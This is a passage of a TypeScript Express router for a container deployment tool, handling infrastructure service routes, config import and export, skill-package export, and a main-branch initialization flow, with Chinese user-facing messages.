      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.delete('/infra/:id', async (req, res) => {
    const { id } = req.params;
    const resolved = resolveInfraProject(req, id);
    if (!resolved) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    if ('ambiguous' in resolved) {
      res.status(400).json({ error: `基础设施服务 "${id}" 在多个项目存在 (${resolved.ambiguous.join(', ')})，请带 ?project=<id>` });
      return;
    }
    const m = assertProjectAccess(req as any, resolved.projectId);
    if (m) { res.status(m.status).json(m.body); return; }
    const service = stateService.getInfraServiceForProjectAndId(resolved.projectId, id);
    if (!service) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    try {
      try { await containerService.stopInfraService(service.containerName); } catch { /* ok */ }
      stateService.removeInfraService(id, resolved.projectId);
      stateService.save();
      res.json({ message: `已删除基础设施服务 "${id}"` });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.post('/infra/:id/start', async (req, res) => {
    const { id } = req.params;
    const resolved = resolveInfraProject(req, id);
    if (!resolved) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    if ('ambiguous' in resolved) {
      res.status(400).json({ error: `基础设施服务 "${id}" 在多个项目存在 (${resolved.ambiguous.join(', ')})，请带 ?project=<id>` });
      return;
    }
    const m = assertProjectAccess(req as any, resolved.projectId);
    if (m) { res.status(m.status).json(m.body); return; }
    const service = stateService.getInfraServiceForProjectAndId(resolved.projectId, id);
    if (!service) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    try {
      await containerService.startInfraService(service);
      stateService.updateInfraService(id, { status: 'running', errorMessage: undefined }, resolved.projectId);
      stateService.save();
      res.json({ message: `基础设施服务 "${id}" 已启动`, service: stateService.getInfraServiceForProjectAndId(resolved.projectId, id) });
    } catch (err) {
      stateService.updateInfraService(id, { status: 'error', errorMessage: (err as Error).message }, resolved.projectId);
      stateService.save();
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.post('/infra/:id/stop', async (req, res) => {
    const { id } = req.params;
    const resolved = resolveInfraProject(req, id);
    if (!resolved) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    if ('ambiguous' in resolved) {
      res.status(400).json({ error: `基础设施服务 "${id}" 在多个项目存在 (${resolved.ambiguous.join(', ')})，请带 ?project=<id>` });
      return;
    }
    const m = assertProjectAccess(req as any, resolved.projectId);
    if (m) { res.status(m.status).json(m.body); return; }
    const service = stateService.getInfraServiceForProjectAndId(resolved.projectId, id);
    if (!service) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    try {
      await containerService.stopInfraService(service.containerName);
      stateService.updateInfraService(id, { status: 'stopped' }, resolved.projectId);
      stateService.save();
      res.json({ message: `基础设施服务 "${id}" 已停止` });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.post('/infra/:id/restart', async (req, res) => {
    const { id } = req.params;
    const resolved = resolveInfraProject(req, id);
    if (!resolved) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    if ('ambiguous' in resolved) {
      res.status(400).json({ error: `基础设施服务 "${id}" 在多个项目存在 (${resolved.ambiguous.join(', ')})，请带 ?project=<id>` });
      return;
    }
    const m = assertProjectAccess(req as any, resolved.projectId);
    if (m) { res.status(m.status).json(m.body); return; }
    const service = stateService.getInfraServiceForProjectAndId(resolved.projectId, id);
    if (!service) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    try {
      try { await containerService.stopInfraService(service.containerName); } catch { /* ok */ }
      await containerService.startInfraService(service);
      stateService.updateInfraService(id, { status: 'running', errorMessage: undefined }, resolved.projectId);
      stateService.save();
      res.json({ message: `基础设施服务 "${id}" 已重启`, service: stateService.getInfraServiceForProjectAndId(resolved.projectId, id) });
    } catch (err) {
      stateService.updateInfraService(id, { status: 'error', errorMessage: (err as Error).message }, resolved.projectId);
      stateService.save();
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.get('/infra/:id/logs', async (req, res) => {
    const { id } = req.params;
    const resolved = resolveInfraProject(req, id);
    if (!resolved) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    if ('ambiguous' in resolved) {
      res.status(400).json({ error: `基础设施服务 "${id}" 在多个项目存在 (${resolved.ambiguous.join(', ')})，请带 ?project=<id>` });
      return;
    }
    const service = stateService.getInfraServiceForProjectAndId(resolved.projectId, id);
    if (!service) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    try {
      const logs = await containerService.getLogs(service.containerName);
      res.json({ logs });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.get('/infra/:id/health', async (req, res) => {
    const { id } = req.params;
    const service = stateService.getInfraService(id);
    if (!service) {
      res.status(404).json({ error: `基础设施服务 "${id}" 不存在` });
      return;
    }
    try {
      const health = await containerService.getInfraHealth(service.containerName);
      res.json({ health });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // Quick setup: discover infra from compose files and start them
  router.post('/infra/quickstart', async (req, res) => {
    const { compose: composeYaml, serviceIds } = req.body as { compose?: string; serviceIds?: string[] };
    const results: { id: string; status: string; error?: string }[] = [];

    // Resolve service definitions: from inline compose YAML, or auto-discover from repo
    let defs: ComposeServiceDef[] = [];
    if (composeYaml) {
      defs = parseComposeString(composeYaml);
    } else {
      const composeFiles = discoverComposeFiles(config.repoRoot);
      const seenIds = new Set<string>();
      for (const file of composeFiles) {
        try {
          for (const def of parseComposeFile(file)) {
            if (!seenIds.has(def.id)) {
              seenIds.add(def.id);
              defs.push(def);
            }
          }
        } catch { /* skip */ }
      }
    }

    // Filter by requested IDs if specified
    if (serviceIds && serviceIds.length > 0) {
      defs = defs.filter(d => serviceIds.includes(d.id));
    }

    if (defs.length === 0) {
      res.json({ results: [], message: '未找到基础设施服务定义。请在项目中添加 docker-compose.yml 或 cds-compose.yml 文件。' });
      return;
    }

    for (const def of defs) {
      // Skip if already exists
      if (stateService.getInfraService(def.id)) {
        results.push({ id: def.id, status: 'exists' });
        continue;
      }

      const service = composeDefToInfraService(def);

      try {
        stateService.addInfraService(service);
        await containerService.startInfraService(service);
        stateService.updateInfraService(service.id, { status: 'running' });
        results.push({ id: service.id, status: 'started' });
      } catch (err) {
        stateService.updateInfraService(service.id, { status: 'error', errorMessage: (err as Error).message });
        results.push({ id: service.id, status: 'error', error: (err as Error).message });
      }
    }

    stateService.save();
    res.json({ results });
  });

  // ── Config Import / Export ──

  /** Validate a CDS Config JSON blob */
  function validateConfigBlob(blob: unknown): { valid: boolean; errors: string[]; warnings: string[] } {
    const errors: string[] = [];
    const warnings: string[] = [];
    if (!blob || typeof blob !== 'object') {
      return { valid: false, errors: ['配置必须是一个 JSON 对象'], warnings };
    }
    const cfg = blob as Record<string, unknown>;
    const schema = cfg.$schema as string | undefined;
    if (schema && schema !== 'cds-config') {
      errors.push('$schema 字段值应为 "cds-config"');
    }
    // Validate buildProfiles
    if (cfg.buildProfiles !== undefined) {
      if (!Array.isArray(cfg.buildProfiles)) {
        errors.push('buildProfiles 必须是数组');
      } else {
        for (let i = 0; i < cfg.buildProfiles.length; i++) {
          const p = cfg.buildProfiles[i] as Record<string, unknown>;
          if (!p.id) errors.push(`buildProfiles[${i}]: 缺少 id`);
          if (!p.name) errors.push(`buildProfiles[${i}]: 缺少 name`);
          if (!p.dockerImage) errors.push(`buildProfiles[${i}]: 缺少 dockerImage`);
          if (!p.command) errors.push(`buildProfiles[${i}]: 缺少 command`);
          if (p.containerPort !== undefined) {
            const port = Number(p.containerPort);
            if (!Number.isInteger(port) || port < 1 || port > 65535) {
              errors.push(`buildProfiles[${i}]: containerPort 必须在 1-65535 之间`);
            }
          }
          // Check corepack prefix for pnpm/yarn commands
          const label = `buildProfiles[${i}]`;
          const cmdWarn = checkCorepackPrefix(p.command as string | undefined, `${label}.command`);
          if (cmdWarn) warnings.push(cmdWarn);

          // Cross-check: if workDir has a lock file that doesn't match the command's PM
          if (p.workDir && typeof p.workDir === 'string') {
            const fullDir = path.join(config.repoRoot, p.workDir);
            if (fs.existsSync(fullDir)) {
              const detectedPm = detectPackageManager(fullDir);
              const cmdToCheck = (p.command as string) || '';
              const usesWrongPm =
                (detectedPm === 'pnpm' && /\bnpm install\b/.test(cmdToCheck)) ||
                (detectedPm === 'npm' && /\bpnpm install\b/.test(cmdToCheck)) ||
                (detectedPm === 'yarn' && !/\byarn install\b/.test(cmdToCheck) && /\b(npm|pnpm) install\b/.test(cmdToCheck));
              if (usesWrongPm) {
                warnings.push(`${label}: 检测到 ${p.workDir}/ 使用 ${detectedPm}，但命令使用了其他包管理器`);
              }
            }
          }
        }
      }
    }
    // Validate envVars
    if (cfg.envVars !== undefined && (typeof cfg.envVars !== 'object' || Array.isArray(cfg.envVars))) {
      errors.push('envVars 必须是键值对对象');
    }
    // Validate infraServices — accepts array of full definitions OR a compose YAML string
    if (cfg.infraServices !== undefined) {
      if (typeof cfg.infraServices === 'string') {
        // Compose YAML string — validate it parses
        try {
          const defs = parseComposeString(cfg.infraServices as string);
          if (defs.length === 0) {
            warnings.push('infraServices (compose YAML): 未解析到任何服务');
          }
        } catch (e) {
          errors.push(`infraServices (compose YAML): 解析失败 — ${(e as Error).message}`);
        }
      } else if (Array.isArray(cfg.infraServices)) {
        for (let i = 0; i < cfg.infraServices.length; i++) {
          const s = cfg.infraServices[i] as Record<string, unknown>;
          if (!s.id) {
            errors.push(`infraServices[${i}]: 缺少 id`);
          }
          if (!s.dockerImage && !s.image) {
            errors.push(`infraServices[${i}]: 缺少 dockerImage`);
          }
          if (!s.containerPort) {
            errors.push(`infraServices[${i}]: 缺少 containerPort`);
          }
        }
      } else {
        errors.push('infraServices 必须是数组或 compose YAML 字符串');
      }
    }
    // Validate routingRules
    if (cfg.routingRules !== undefined) {
      if (!Array.isArray(cfg.routingRules)) {
        errors.push('routingRules 必须是数组');
      }
    }
    return { valid: errors.length === 0, errors, warnings };
  }

  /** Resolve infraServices from config — supports array of full defs or compose YAML string */
  function resolveInfraDefs(cfg: Record<string, unknown>): ComposeServiceDef[] {
    if (!cfg.infraServices) return [];

    if (typeof cfg.infraServices === 'string') {
      return parseComposeString(cfg.infraServices as string);
    }

    if (Array.isArray(cfg.infraServices)) {
      return (cfg.infraServices as Array<Record<string, unknown>>).map(s => ({
        id: (s.id as string) || '',
        name: (s.name as string) || (s.id as string) || '',
        dockerImage: (s.dockerImage as string) || (s.image as string) || '',
        containerPort: (s.containerPort as number) || 0,
        volumes: (s.volumes as Array<{ name: string; containerPath: string }>) || [],
        env: (s.env as Record<string, string>) || {},
        healthCheck: s.healthCheck as ComposeServiceDef['healthCheck'],
      }));
    }

    return [];
  }

  /** Preview what an import would do (without applying) */
  function previewImport(cfg: Record<string, unknown>) {
    const summary = {
      buildProfiles: { add: 0, replace: 0, skip: 0, items: [] as string[] },
      envVars: { add: 0, replace: 0, items: [] as string[] },
      infraServices: { add: 0, skip: 0, items: [] as string[] },
      routingRules: { add: 0, replace: 0, items: [] as string[] },
    };

    if (Array.isArray(cfg.buildProfiles)) {
      for (const p of cfg.buildProfiles as Array<{ id: string; name?: string }>) {
        const existing = stateService.getBuildProfile(p.id);
        if (existing) {
          summary.buildProfiles.replace++;
          summary.buildProfiles.items.push(`替换: ${p.name || p.id}`);
        } else {
          summary.buildProfiles.add++;
          summary.buildProfiles.items.push(`新增: ${p.name || p.id}`);
        }
      }
    }

    if (cfg.envVars && typeof cfg.envVars === 'object') {
      const currentEnv = stateService.getCustomEnv();
      for (const key of Object.keys(cfg.envVars as Record<string, string>)) {
        if (key in currentEnv) {
          summary.envVars.replace++;
          summary.envVars.items.push(`覆盖: ${key}`);
        } else {
          summary.envVars.add++;
          summary.envVars.items.push(`新增: ${key}`);
        }
      }
    }

    // Resolve infra services from array or compose YAML string
    const infraDefs = resolveInfraDefs(cfg);
    for (const def of infraDefs) {
      const existing = stateService.getInfraService(def.id);
      if (existing) {
        summary.infraServices.skip++;
        summary.infraServices.items.push(`跳过 (已存在): ${def.id}`);
      } else {
        summary.infraServices.add++;
        summary.infraServices.items.push(`新增: ${def.name || def.id}`);
      }
    }

    if (Array.isArray(cfg.routingRules)) {
      for (const r of cfg.routingRules as Array<{ id: string; name?: string }>) {
        const existing = stateService.getRoutingRules().find(x => x.id === r.id);
        if (existing) {
          summary.routingRules.replace++;
          summary.routingRules.items.push(`替换: ${r.name || r.id}`);
        } else {
          summary.routingRules.add++;
          summary.routingRules.items.push(`新增: ${r.name || r.id}`);
        }
      }
    }

    return summary;
  }

  // POST /api/import-config — validate, preview, and optionally apply
  // Accepts { config: <JSON object | YAML string>, dryRun? }
  // Auto-detects format: YAML string → CDS compose, JSON object → direct config
  router.post('/import-config', async (req, res) => {
    try {
      const { config: configBlob, dryRun } = req.body as { config: unknown; dryRun?: boolean };

      // Auto-detect format: string → try CDS compose YAML, object → JSON config
      let cfg: Record<string, unknown>;
      if (typeof configBlob === 'string') {
        const cdsConfig = parseCdsCompose(configBlob);
        if (cdsConfig) {
          // Convert CDS compose to internal format (reuse existing validate/apply pipeline)
          cfg = {
            $schema: 'cds-config',
            buildProfiles: cdsConfig.buildProfiles,
            envVars: cdsConfig.envVars,
            infraServices: cdsConfig.infraServices.length > 0 ? cdsConfig.infraServices : undefined,
            routingRules: cdsConfig.routingRules.length > 0 ? cdsConfig.routingRules : undefined,
          };
        } else {
          // Not a CDS compose — try parsing as JSON string
          try {
            cfg = JSON.parse(configBlob);
          } catch {
            res.status(400).json({
              valid: false,
              errors: ['无法解析输入：既不是有效的 CDS Compose YAML（需包含 services 定义），也不是有效的 JSON'],
              warnings: [],
            });
            return;
          }
        }
      } else {
        cfg = configBlob as Record<string, unknown>;
      }

      // Validate
      const validation = validateConfigBlob(cfg);
      if (!validation.valid) {
        res.status(400).json({ valid: false, errors: validation.errors, warnings: validation.warnings });
        return;
      }
      const preview = previewImport(cfg);

      // If dry run, return preview only (include warnings)
      if (dryRun) {
        res.json({ valid: true, preview, applied: false, warnings: validation.warnings });
        return;
      }

      // Apply: build profiles (add or replace)
      if (Array.isArray(cfg.buildProfiles)) {
        for (const p of cfg.buildProfiles as BuildProfile[]) {
          const existing = stateService.getBuildProfile(p.id);
          if (existing) {
            stateService.updateBuildProfile(p.id, p);
          } else {
            p.workDir = p.workDir || '.';
            p.containerPort = p.containerPort || 8080;
            stateService.addBuildProfile(p);
          }
        }
      }

      // Apply: env vars (merge, new wins)
      if (cfg.envVars && typeof cfg.envVars === 'object') {
        const newVars = cfg.envVars as Record<string, string>;
        for (const [key, value] of Object.entries(newVars)) {
          stateService.setCustomEnvVar(key, value);
        }
      }

      // Apply: infra services (add if not exists, skip existing)
      const infraResults: { id: string; status: string }[] = [];
      const infraDefs = resolveInfraDefs(cfg);
      for (const def of infraDefs) {
        if (stateService.getInfraService(def.id)) {
          infraResults.push({ id: def.id, status: 'exists' });
          continue;
        }

        if (def.id && def.dockerImage && def.containerPort) {
          const service = composeDefToInfraService(def);
          stateService.addInfraService(service);
          infraResults.push({ id: service.id, status: 'created' });
        }
      }

      // Apply: routing rules (add or replace)
      if (Array.isArray(cfg.routingRules)) {
        for (const r of cfg.routingRules as RoutingRule[]) {
          const existing = stateService.getRoutingRules().find(x => x.id === r.id);
          if (existing) {
            stateService.updateRoutingRule(r.id, r);
          } else {
            r.priority = r.priority ?? 0;
            r.enabled = r.enabled ?? true;
            stateService.addRoutingRule(r);
          }
        }
      }

      // Sync CDS config (domains etc.)
      syncCdsConfig();
      stateService.save();

      res.json({
        valid: true,
        preview,
        applied: true,
        infraResults,
        warnings: validation.warnings,
        message: '配置已成功导入',
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // GET /api/export-config — export current config as CDS Compose YAML (default) or JSON
  // Export current CDS config as Compose YAML
  router.get('/export-config', (_req, res) => {
    const profiles = stateService.getBuildProfiles();
    const envVars = stateService.getCustomEnv();
    const infra = stateService.getInfraServices();
    const rules = stateService.getRoutingRules();

    const yamlContent = toCdsCompose(profiles, envVars, infra, rules);
    res.type('text/yaml').send(yamlContent);
  });

  // GET /api/cli-version — return the currently-bundled cdscli VERSION
  //
  // 读 .claude/skills/cds/cli/cdscli.py 里的 `VERSION = "x.y.z"` 常量，
  // 每次被 cdscli update / cdscli version 调用时返回。解析结果缓存 60s
  // 避免每次都 read+regex（CLI 进程短命，主要让 Dashboard 轮询便宜）。
  let _cliVersionCache: { version: string | null; at: number } = { version: null, at: 0 };
  function readBundledCliVersion(): string | null {
    const now = Date.now();
    if (_cliVersionCache.version !== null && now - _cliVersionCache.at < 60_000) {
      return _cliVersionCache.version;
    }
    try {
      const cliPath = path.join(config.repoRoot, '.claude', 'skills', 'cds', 'cli', 'cdscli.py');
      if (!fs.existsSync(cliPath)) {
        _cliVersionCache = { version: null, at: now };
        return null;
      }
      const content = fs.readFileSync(cliPath, 'utf-8');
      // Anchor on VERSION = "..." at start of line to avoid catching
      // comments, test fixtures, or nested module vars. Only first match.
      const match = content.match(/^VERSION\s*=\s*"([^"]+)"/m);
      const version = match ? match[1] : null;
      _cliVersionCache = { version, at: now };
      return version;
    } catch {
      return null;
    }
  }
  router.get('/cli-version', (_req, res) => {
    const version = readBundledCliVersion();
    if (!version) {
      res.status(404).json({ error: '未找到 cdscli VERSION 常量' });
      return;
    }
    res.json({ version });
  });

  // GET /api/export-skill — export unified cds skill as tar.gz
  //
  // 2026-04-18 重构：合并 cds-project-scan + cds-deploy-pipeline + smoke-test
  // 为单一 cds 技能，带 cli/ Python CLI + reference/ 按需文档 + SKILL.md 入口。
  // 旧入参 `?legacy=1` 仍能导出 cds-project-scan 单独的文档（向后兼容）。
  router.get('/export-skill', (req, res) => {
    try {
      const useLegacy = req.query.legacy === '1';
      const skillName = useLegacy ? 'cds-project-scan' : 'cds';
      const skillDir = path.join(config.repoRoot, '.claude', 'skills', skillName);
      if (!fs.existsSync(skillDir)) {
        res.status(404).json({ error: `未找到 ${skillName} 技能目录` });
        return;
      }

      // Build pack in a temp directory
      const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
      const packName = `${skillName}-skill-${timestamp}`;
      const tmpDir = path.join(config.repoRoot, '.cds', 'tmp');
      const packDir = path.join(tmpDir, packName);

      // Recursively copy the whole skill directory (captures cli/ and
      // reference/ subdirs without per-file enumeration). This mirrors
      // whatever layout the skill author uses so the drop-in on the
      // consumer side stays identical to the source.
      const targetSkillDir = path.join(packDir, '.claude', 'skills', skillName);
      fs.mkdirSync(targetSkillDir, { recursive: true });
      const copyRecursive = (src: string, dst: string) => {
        const stat = fs.statSync(src);
        if (stat.isDirectory()) {
          fs.mkdirSync(dst, { recursive: true });
          for (const entry of fs.readdirSync(src)) {
            copyRecursive(path.join(src, entry), path.join(dst, entry));
          }
        } else {
          fs.copyFileSync(src, dst);
        }
      };
      copyRecursive(skillDir, targetSkillDir);

      // README tailored to the new unified skill
      const readme = useLegacy
        ? `# CDS 部署技能包 (legacy: cds-project-scan)\n\n将 \`.claude/skills/cds-project-scan/\` 复制到目标项目的对应路径。\n`
        : `# CDS 技能包 (统一版)

覆盖 CDS 全生命周期：扫描项目 → Agent 鉴权 → 部署 → 就绪检测 → 分层冒烟 → 故障诊断。

## 三分钟安装

\`\`\`bash
# 1. 解压到你项目的根目录（保留 .claude/skills/cds/ 结构）
tar -xzf ${packName}.tar.gz --strip-components=1

# 2. 加 alias（推荐）
echo 'alias cdscli="python3 \\$(git rev-parse --show-toplevel)/.claude/skills/cds/cli/cdscli.py"' >> ~/.bashrc
source ~/.bashrc

# 3. 初始化（交互式）
cdscli init

# 4. 验证
cdscli auth check
cdscli project list --human
\`\`\`

## 主要命令

| 命令 | 用途 |
|------|------|
| \`cdscli init\` | 首次配置 CDS_HOST / AI_ACCESS_KEY / 默认 projectId |
| \`cdscli scan --apply-to-cds <projectId>\` | 扫描本地 → 生成 compose YAML → 提交 CDS 审批 |
| \`cdscli deploy\` | 推代码 + 部署 + 等待 + 冒烟（一条命令）|
| \`cdscli help-me-check <branchId>\` | 出 bug 了？这条命令抓状态+日志+env+history+根因分析 |
| \`cdscli smoke <branchId>\` | 分层冒烟（L1 根路径 / L2 API / L3 认证 API）|
| \`cdscli --help\` | 完整命令树 |

## 详细文档

| 文件 | 何时看 |
|------|--------|
| \`.claude/skills/cds/SKILL.md\` | Claude Code 自动加载，主入口 |
| \`.claude/skills/cds/reference/api.md\` | 需要 curl 直调 API |
| \`.claude/skills/cds/reference/auth.md\` | 401 / 403 排查 |
| \`.claude/skills/cds/reference/scan.md\` | 扫描规则 & compose YAML 契约 |
| \`.claude/skills/cds/reference/smoke.md\` | 分层冒烟策略 |
| \`.claude/skills/cds/reference/diagnose.md\` | 容器日志 → 根因决策树 |
| \`.claude/skills/cds/reference/drop-in.md\` | 新项目接入完整步骤 |

## 升级

直接重新下载本包覆盖即可，\`~/.cdsrc\` 不受影响。

## 反馈

缺功能 / 新根因模式 / 扫描误判 → 把 \`cdscli diagnose <branchId>\` 输出贴给维护方。
`;
      fs.writeFileSync(path.join(packDir, 'README.md'), readme, 'utf-8');

      // Create tar.gz using tar command (available on all Linux)
      const tarName = `${packName}.tar.gz`;
      execSync(`cd "${tmpDir}" && tar -czf "${tarName}" "${packName}/"`, { stdio: 'pipe' });

      // Clean up pack dir
      fs.rmSync(packDir, { recursive: true, force: true });

      // Send tar.gz
      const tarPath = path.join(tmpDir, tarName);
      const stat = fs.statSync(tarPath);
      res.setHeader('Content-Type', 'application/gzip');
      res.setHeader('Content-Disposition', `attachment; filename="${tarName}"`);
      res.setHeader('Content-Length', stat.size);
      const stream = fs.createReadStream(tarPath);
      stream.pipe(res);
      stream.on('end', () => {
        fs.unlink(tarPath, () => {});
      });
    } catch (e) {
      console.error('export-skill error:', e);
      if (!res.headersSent) {
        res.status(500).json({ error: '导出失败: ' + (e as Error).message });
      }
    }
  });

  // POST /api/import-and-init — import config + start infra + create main branch + deploy (SSE progress)
  // Same config parsing as /import-config, but after applying config it also:
  //   1. Starts all new infra services
  //   2. Creates a main branch worktree (if not exists)
  //   3. Deploys the main branch (build + run all profiles)
  router.post('/import-and-init', async (req, res) => {
    const { config: configBlob } = req.body as { config: unknown };

    // ── Parse config (same logic as import-config) ──
    let cfg: Record<string, unknown>;
    if (typeof configBlob === 'string') {
      const cdsConfig = parseCdsCompose(configBlob);
      if (cdsConfig) {
        cfg = {
          $schema: 'cds-config',
          buildProfiles: cdsConfig.buildProfiles,
          envVars: cdsConfig.envVars,
          infraServices: cdsConfig.infraServices.length > 0 ? cdsConfig.infraServices : undefined,
          routingRules: cdsConfig.routingRules.length > 0 ? cdsConfig.routingRules : undefined,
        };
      } else {
        try {
          cfg = JSON.parse(configBlob);
        } catch {
          res.status(400).json({ error: '无法解析配置：既不是有效的 CDS Compose YAML，也不是有效的 JSON' });
          return;
        }
      }
    } else {
      cfg = configBlob as Record<string, unknown>;
    }

    // Validate
    const validation = validateConfigBlob(cfg);
    if (!validation.valid) {
      res.status(400).json({ valid: false, errors: validation.errors });
      return;
    }

    // ── Start SSE stream ──
    initSSE(res);
    const send = (step: string, status: string, title: string) => {
      sendSSE(res, 'step', { step, status, title, timestamp: new Date().toISOString() });
    };

    try {
      // ── Phase 1: Apply config ──
      send('config', 'running', '正在写入配置...');

      // Apply build profiles
      if (Array.isArray(cfg.buildProfiles)) {
        for (const p of cfg.buildProfiles as BuildProfile[]) {
          const existing = stateService.getBuildProfile(p.id);
          if (existing) {
            stateService.updateBuildProfile(p.id, p);
          } else {
            p.workDir = p.workDir || '.';
            p.containerPort = p.containerPort || 8080;
            stateService.addBuildProfile(p);
          }
        }
      }

      // Apply env vars
      if (cfg.envVars && typeof cfg.envVars === 'object') {
        for (const [key, value] of Object.entries(cfg.envVars as Record<string, string>)) {
          stateService.setCustomEnvVar(key, value);
        }
      }

      // Apply routing rules
      if (Array.isArray(cfg.routingRules)) {
        for (const r of cfg.routingRules as RoutingRule[]) {
          const existing = stateService.getRoutingRules().find(x => x.id === r.id);
          if (existing) {
            stateService.updateRoutingRule(r.id, r);
          } else {
            r.priority = r.priority ?? 0;
            r.enabled = r.enabled ?? true;
            stateService.addRoutingRule(r);
          }
        }
      }

      // Apply infra service definitions (don't start yet)
      const infraDefs = resolveInfraDefs(cfg);
      const newInfraServices: InfraService[] = [];
      for (const def of infraDefs) {
        if (stateService.getInfraService(def.id)) continue;
        if (def.id && def.dockerImage && def.containerPort) {
          const service = composeDefToInfraService(def);
          stateService.addInfraService(service);
          newInfraServices.push(service);
        }
      }

      syncCdsConfig();
      stateService.save();
      send('config', 'done', `配置已写入 (${stateService.getBuildProfiles().length} 个构建配置, ${newInfraServices.length} 个基础设施)`);

      // ── Phase 2: Start infra services ──
      const allInfra = stateService.getInfraServices();
      const infraToStart = allInfra.filter(s => s.status !== 'running');
      if (infraToStart.length > 0) {
        send('infra', 'running', `正在启动 ${infraToStart.length} 个基础设施服务...`);
        for (const svc of infraToStart) {
          send(`infra-${svc.id}`, 'running', `正在启动 ${svc.name} (${svc.dockerImage})...`);
          try {
            await containerService.startInfraService(svc);
            stateService.updateInfraService(svc.id, { status: 'running', errorMessage: undefined });
            send(`infra-${svc.id}`, 'done', `${svc.name} 已启动 → :${svc.hostPort}`);
          } catch (err) {
            stateService.updateInfraService(svc.id, { status: 'error', errorMessage: (err as Error).message });
            send(`infra-${svc.id}`, 'error', `${svc.name} 启动失败: ${(err as Error).message}`);
          }
        }
        stateService.save();
        send('infra', 'done', '基础设施服务就绪');
      } else {
        send('infra', 'done', '基础设施服务已在运行中');
      }

      // ── Phase 3: Create main branch worktree ──
      // Detect default branch name
      let mainBranch = 'main';
      try {
        const result = await shell.exec('git symbolic-ref refs/remotes/origin/HEAD', { cwd: config.repoRoot, timeout: 5000 });
        const ref = result.stdout.trim(); // e.g., refs/remotes/origin/main
        if (ref) mainBranch = ref.replace('refs/remotes/origin/', '');
      } catch {
        // Fallback: try 'main', then 'master'
        try {
          await shell.exec('git rev-parse --verify origin/main', { cwd: config.repoRoot, timeout: 5000 });
          mainBranch = 'main';
        } catch {
          mainBranch = 'master';
        }
      }

      const mainSlug = StateService.slugify(mainBranch);
      let entry = stateService.getBranch(mainSlug);

      if (!entry) {
        send('worktree', 'running', `正在为 ${mainBranch} 创建工作树...`);
        // Ensure worktreeBase directory exists (first-time setup).
        // P4 Part 18 (G1.2): the initialize flow bootstraps the legacy
        // default project's main branch, so it always uses config.repoRoot.
        // FU-04: bootstrap lives under the default project bucket.
        const worktreePath = WorktreeService.worktreePathFor(config.worktreeBase, 'default', mainSlug);
        await shell.exec(`mkdir -p "${path.posix.dirname(worktreePath)}"`);
        await worktreeService.create(config.repoRoot, mainBranch, worktreePath);

        entry = {
          id: mainSlug,
          branch: mainBranch,
          worktreePath,
          services: {},
          status: 'idle',
          createdAt: new Date().toISOString(),
        };
        stateService.addBranch(entry);
        if (!stateService.getState().defaultBranch) {
          stateService.setDefaultBranch(mainSlug);
        }
        stateService.save();
        send('worktree', 'done', `工作树已创建: ${mainBranch}`);
      } else {
        send('worktree', 'done', `工作树已存在: ${mainBranch}`);
      }

      // ── Phase 4: Deploy main branch (build + run all profiles) ──
      const profiles = stateService.getBuildProfiles();
      if (profiles.length > 0) {
        send('deploy', 'running', `正在部署 ${mainBranch} (${profiles.length} 个服务)...`);

        entry.status = 'building';
        stateService.save();

        // Pre-allocate ports
        for (const profile of profiles) {
          if (!entry.services[profile.id]) {
            const hostPort = stateService.allocatePort(config.portStart);
            entry.services[profile.id] = {
              profileId: profile.id,
              containerName: `cds-${mainSlug}-${profile.id}`,
              hostPort,
              status: 'idle',
            };
          }
        }
        stateService.save();

        const mergedEnv = getMergedEnv(entry.projectId);

        for (const profile of profiles) {
          const svc = entry.services[profile.id];
          send(`deploy-${profile.id}`, 'running', `正在构建 ${profile.name}...`);
          svc.status = 'building';

          try {
            await containerService.runService(entry, profile, svc, (chunk) => {
              sendSSE(res, 'log', { profileId: profile.id, chunk });
            }, mergedEnv);

            svc.status = 'running';
            send(`deploy-${profile.id}`, 'done', `${profile.name} 就绪 → :${svc.hostPort}`);
          } catch (err) {
            svc.status = 'error';
            entry.errorMessage = (err as Error).message;
            send(`deploy-${profile.id}`, 'error', `${profile.name} 构建失败: ${(err as Error).message}`);
          }
        }

        const hasError = Object.values(entry.services).some(s => s.status === 'error');
        entry.status = hasError ? 'error' : 'running';
        stateService.save();

        send('deploy', hasError ? 'error' : 'done',
          hasError ? '部分服务构建失败' : `部署完成，所有服务已就绪`);
      }

      send('complete', 'done', '初始化完成');
      sendSSE(res, 'done', { message: '初始化完成' });
    } catch (err) {
      send('error', 'error', `初始化失败: ${(err as Error).message}`);
      sendSSE(res, 'error', { message: (err as Error).message });
    }

    res.end();
  });

  // ── Self-update: switch CDS's own branch, pull, and restart ──

  // ── Data Migration ──

  /** Resolve 'local' MongoDB connection to actual host:port from infra */
  function resolveMongoConn(conn: MongoConnectionConfig): MongoConnectionConfig {
    if (conn.type === 'local') {
      const mongoInfra = stateService.getInfraServices().find(s => s.id === 'mongodb');
      if (!mongoInfra) throw new Error('本机 MongoDB 未在 CDS 基础设施中注册');
      const dockerHost = stateService.getCdsEnvVars()['CDS_HOST'] || '172.17.0.1';
      return { ...conn, host: dockerHost, port: mongoInfra.hostPort };
    }
    return conn;
  }

  /** Build mongosh auth args */
  function mongoAuthArgs(conn: MongoConnectionConfig): string {
    let args = '';
    if (conn.username) args += ` -u ${conn.username}`;
    if (conn.password) args += ` -p ${conn.password}`;
    if (conn.authDatabase) args += ` --authenticationDatabase ${conn.authDatabase}`;
    return args;
  }

